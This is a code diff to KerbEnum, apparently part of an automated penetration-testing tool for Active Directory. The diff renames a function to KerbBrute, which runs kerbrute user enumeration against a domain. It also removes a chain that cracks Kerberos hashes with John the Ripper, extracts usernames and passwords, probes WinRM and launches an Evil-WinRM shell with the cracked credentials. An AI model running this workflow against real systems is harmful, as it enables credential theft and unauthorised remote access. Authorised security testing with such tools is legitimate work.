@@ -78,7 +78,7 @@ class KerbEnum:
             except FileNotFoundError as fnf_error:
                 print(fnf_error)
 
-        def GetNPUsers():
+        def KerbBrute():
             domain = parse_ad_domain()
             if domain:
                 dope_cmd = f"""{c.getCmd("kerberos", "kerbrute", domain=str(domain[0]))}"""
@@ -89,65 +89,4 @@ class KerbEnum:
                     print(users)
                     print("Todo: finish this module...")
 
-        def check_parse_hashes():
-            GetNPUsers()
-
-        def HeresJonny():
-            check_parse_hashes()
-            return False
-
-        def parseCreds():
-            def cmdline(command):
-                process = Popen(args=command, stdout=PIPE, shell=True)
-                return process.communicate()[0]
-
-            john_show_cmd = c.getCmd("john", "jshow", hashfile=f"{c.getPath('loot', 'krbHashes')}")
-            john_show_output = [i.strip() for i in cmdline(john_show_cmd).decode("utf-8").split("\n")]
-            num_cracked = [int(p[0]) for p in sorted(set(i for i in john_show_output if "password hash cracked," in i))]
-            if (len(num_cracked) > 0):
-                if num_cracked[0] >= 1:
-                    passwords = []
-                    usernames = []
-                    for i in john_show_output:
-                        if ":" in i:
-                            passwords.append(i.split(":")[1])
-                            usernames.append(i.split(":")[0].split("$")[3].split("@")[0])
-                            # print(i.split(":")[1])
-                    return zip(usernames, passwords)
-
-        def checkWinRm():
-            if HeresJonny() is True:
-                r = requests.post(f"http://{self.target}:5985/wsman", data="")
-                if r.status_code == 401:
-                    try:
-                        user_pass = dict(parseCreds())
-                    except TypeError as te:
-                        print(te)
-                        return 1
-                    users = []
-                    passwords = []
-                    for k, v in user_pass.items():
-                        users.append(k)
-                        passwords.append(v)
-                    if len(users) != 0 and (len(passwords) != 0):
-                        try:
-                            dope = f"""{c.getCmd("winrm", "evilWinRM", username=users[0], password=passwords[0], SHELL="$SHELL")}"""
-                            print(f"[{fg.li_magenta}+{fg.rs}] Found Valid Credentials!!!")
-                            print(f"[{fg.li_magenta}+{fg.rs}] {fg.li_green}{user_pass}{fg.rs}")
-                            print(f"[{fg.li_magenta}+{fg.rs}] Evil-WinRM !!!")
-                            print(f"[{fg.li_magenta}+{fg.rs}] " + dope)
-                            print(f"[{fg.li_magenta}+{fg.rs}] Enjoy the Shell Playboy ;) ")
-                            kwargs = {}
-                            kwargs.update(start_new_session=True)
-                            revshell = Popen(args=dope, stdin=PIPE, stdout=PIPE, stderr=PIPE, shell=True, **kwargs)
-                            assert not revshell.poll()
-
-                        except IOError as e:
-                            print(e)
-                            exit()
-            else:
-                print(f"[{fg.red}+{fg.rs}] No valid Credentials Found. {fg.red}Try Harder{fg.rs}")
-                if not os.path.exists(c.getPath("loot", "lootDir")):
-                    os.makedirs(c.getPath("loot", "lootDir"))
-
-        checkWinRm()
+        KerbBrute()
